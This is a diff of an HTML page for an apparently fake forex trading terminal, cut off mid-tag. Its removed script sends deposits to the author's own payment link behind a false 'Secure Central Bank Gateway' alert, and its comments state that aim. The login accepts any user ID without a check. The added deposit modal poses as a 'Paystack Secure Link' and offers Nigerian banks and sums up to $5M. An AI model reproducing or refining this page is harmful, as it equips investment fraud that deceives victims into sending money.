@@ -1,31 +1,69 @@
-<script>
-    // 1. PUT YOUR REAL PAYMENT LINK HERE
-    const MY_PAYMENT_LINK = "https://flutterwave.com/pay/your-link-here"; 
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trade | Thrones Forex Terminal</title>
+    <meta name="description" content="Professional Forex and Stock trading terminal. Secure global market access.">
+    
+    <style>
+        :root { --bg: #06090f; --panel: #121824; --green: #00ff88; --red: #ff3b3b; --accent: #c1a461; --text: #f0f2f5; --border: #1e2633; }
+        @keyframes led-glow { 0% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } 50% { border-color: #00ff00; box-shadow: 0 0 10px #00ff00; } 100% { border-color: #ff0000; box-shadow: 0 0 10px #ff0000; } }
+        body { background: var(--bg); color: var(--text); font-family: 'Inter', sans-serif; margin: 0; height: 100vh; overflow: hidden; border: 4px solid #f00; animation: led-glow 5s infinite; box-sizing: border-box; }
 
-    function confirmDeposit(amt) {
-        const bank = document.getElementById('bankSelect').value;
-        const phone = document.getElementById('transactPhone').value;
+        /* MODALS */
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100000; display: none; align-items: center; justify-content: center; }
+        .modal-card { background: var(--panel); padding: 25px; border-radius: 12px; border: 2px solid var(--accent); width: 360px; text-align: center; box-shadow: 0 0 40px rgba(193, 164, 97, 0.3); }
         
-        if(!phone) { alert("Please enter your Phone Number."); return; }
-        if(!bank) { alert("Please select a Bank."); return; }
-        
-        // This alerts them where the money is going
-        alert("Redirecting to Secure Central Bank Gateway...\nBank: " + bank + "\nAmount: $" + amt.toLocaleString());
-        
-        // This sends them to your real Flutterwave/Paystack link to pay you
-        window.location.href = MY_PAYMENT_LINK + "?amount=" + amt + "&customer_phone=" + phone;
-    }
+        input, select { width: 100%; padding: 12px; margin: 8px 0; background: #000; border: 1px solid var(--border); color: white; border-radius: 6px; box-sizing: border-box; }
+        .amt-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin: 15px 0; }
+        .amt-btn { padding: 12px; background: #000; border: 1px solid var(--border); color: var(--green); cursor: pointer; border-radius: 4px; font-weight: 900; font-size: 13px; }
+        .amt-btn:hover { border-color: var(--green); background: rgba(0,255,136,0.05); }
 
-    function doLogin(e) {
-        e.preventDefault();
-        const user = document.getElementById('uID').value;
-        localStorage.setItem('tradeAuth', user);
-        document.getElementById('loginScreen').style.display = 'none';
-    }
+        /* LOGIN */
+        #loginScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: var(--bg); z-index: 99999; display: flex; align-items: center; justify-content: center; }
+        .classic-captcha { display: flex; align-items: center; justify-content: space-between; background: #f9f9f9; color: #555; padding: 10px; border-radius: 3px; border: 1px solid #d3d3d3; margin: 12px 0; text-align: left; }
+        .btn-action { width: 100%; padding: 14px; background: var(--accent); color: black; border: none; font-weight: 900; border-radius: 6px; cursor: pointer; }
 
-    window.onload = function() {
-        if(localStorage.getItem('tradeAuth')) {
-            document.getElementById('loginScreen').style.display = 'none';
-        }
-    }
-</script>
+        header { background: var(--panel); padding: 12px 25px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border); }
+        .app-shell { display: flex; height: calc(100vh - 55px); }
+        .center-stack { flex: 1; background: #000; display: flex; flex-direction: column; }
+        .sidebar-right { width: 320px; background: var(--panel); border-left: 1px solid var(--border); padding: 15px; }
+        
+        .wallet-card { background: #000; padding: 15px; border-radius: 10px; border: 1px solid var(--border); margin-bottom: 15px; }
+        .toggle-btn { background: none; border: none; color: var(--accent); font-size: 10px; cursor: pointer; float: right; margin-top: -38px; margin-right: 10px; position: relative; }
+    </style>
+</head>
+<body>
+
+    <div id="depositModal" class="overlay">
+        <div class="modal-card">
+            <h3 style="color:var(--accent); margin-bottom: 5px;">INSTANT FUNDING</h3>
+            <p style="font-size: 10px; color: #777; margin-bottom: 15px;">Paystack Secure Link</p>
+            
+            <input type="tel" id="transactPhone" placeholder="Mobile Number (e.g. 08153609706)" required>
+            
+            <select id="bankSelect">
+                <option value="" disabled selected>-- Choose Bank --</option>
+                <optgroup label="Nigeria Digital">
+                    <option value="OPay">OPay</option>
+                    <option value="PalmPay">PalmPay</option>
+                    <option value="Kuda">Kuda Bank</option>
+                    <option value="Moniepoint">Moniepoint</option>
+                </optgroup>
+                <optgroup label="Nigeria Commercial">
+                    <option value="GTBank">GTBank</option>
+                    <option value="Zenith">Zenith Bank</option>
+                    <option value="Access">Access Bank</option>
+                </optgroup>
+            </select>
+
+            <div class="amt-grid">
+                <button class="amt-btn" onclick="confirmDeposit(100000)">$100,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(200000)">$200,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(300000)">$300,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(500000)">$500,000</button>
+                <button class="amt-btn" onclick="confirmDeposit(1000000)" style="color:#ffd700;">$1M (VIP)</button>
+                <button class="amt-btn" onclick="confirmDeposit(5000000)" style="color:#ffd700;">$5M (MAX)</button>
+            </div>
+            <button onclick="document.getElementById('depositModal').style.display='none'" style="background:none; border:none
